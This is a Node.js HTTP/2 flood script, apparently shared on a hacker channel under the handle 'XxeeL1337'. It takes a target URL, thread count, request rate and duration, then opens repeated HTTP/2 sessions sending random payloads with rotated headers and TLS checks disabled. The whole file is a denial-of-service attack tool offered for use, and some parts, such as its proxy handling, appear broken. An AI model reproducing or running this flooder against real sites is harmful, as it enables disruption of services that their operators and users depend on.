//methods created by XxeeL1337
// Telegram @xxeel1337
// do not sell this script shit
const fs = require('fs');
const http2 = require('http2');
const crypto = require('crypto');

const host = process.argv[2];
const target = process.argv[3];
const time = process.argv[4] ? process.argv[4] * 1000 : null; // Convert seconds to milliseconds if provided
const threads = process.argv[5] || 10;
const rate = process.argv[6] || 100;
const proxyFile = process.argv[7];
const useragentFile = process.argv[8];
const refererFile = process.argv[9];

if (!host || !target) {
  console.error('Usage: node script.js <host> <target> [<time/second> <threads> <rate> <proxy> <useragent> <referer>]');
  process.exit(1);
}

let cplist;
if (useragentFile) {
  try {
    cplist = fs.readFileSync(useragentFile, 'utf8').trim();
  } catch (err) {
    console.error('Error reading User-Agent and cplist file:', err.message);
    process.exit(1);
  }
} else {
  console.error('User-Agent and cplist file is not provided.');
  process.exit(1);
}

const acceptValues = [
  'text/html',
  'application/xhtml+xml',
  'application/xml;q=0.9',
  'image/webp,*/*;q=0.8',
  'application/json',
];

const acceptEncodingValues = ['gzip', 'deflate', 'br']; // Group of Accept-Encoding values

// Read referer from file
let referer;
if (refererFile) {
  try {
    referer = fs.readFileSync(refererFile, 'utf8').trim();
  } catch (err) {
    console.error('Error reading Referer file:', err.message);
    process.exit(1);
  }
} else {
  console.error('Referer file is not provided.');
  process.exit(1);
}

const options = {
  rejectUnauthorized: false,
  headers: generateHeaders(),
};

if (proxyFile) {
  try {
    const proxyData = fs.readFileSync(proxyFile, 'utf8');
    const proxyUrl = new URL(proxyData.trim());
    options.agent = http2.connect(proxyUrl);
  } catch (err) {
    console.error('Error reading proxy file:', err.message);
    process.exit(1);
  }
}

function generateHeaders() {
  return {
    'Host': host,
    'Accept': acceptValues.join(', '), // Combine the accept values
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': acceptEncodingValues.join(', '), // Combine the Accept-Encoding values
    'Referer': referer, // Use the referer from file
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
    'cplist': cplist, // Use cplist from file
  };
}

function generatePayload() {
  // Generate a random payload using crypto
  const payloadSize = 100; // Adjust the payload size as needed
  return crypto.randomBytes(payloadSize).toString('hex');
}

const flood = () => {
  const session = http2.connect(target, options);

  session.on('error', (err) => {
    // Handle errors if needed
    console.error('Request error:', err.message);
  });

  const req = session.request();
  req.setEncoding('utf8');

  req.on('response', (headers, flags) => {
    // Handle response if necessary
  });

  req.on('end', () => {
    session.destroy();
  });

  const payload = generatePayload();
  req.end(`{"data": "${payload}"}`);
};

// Start the flood based on specified threads and rate
const startFlood = () => {
  const requestsPerThread = rate / threads;

  const interval = setInterval(() => {
    for (let i = 0; i < threads; i++) {
      for (let j = 0; j < requestsPerThread; j++) {
        options.headers = generateHeaders(); // Update headers for each request
        flood();
      }
    }
  }, 1000);

  setTimeout(() => {
    clearInterval(interval);
  }, time);
};

// Execute the flood
startFlood();
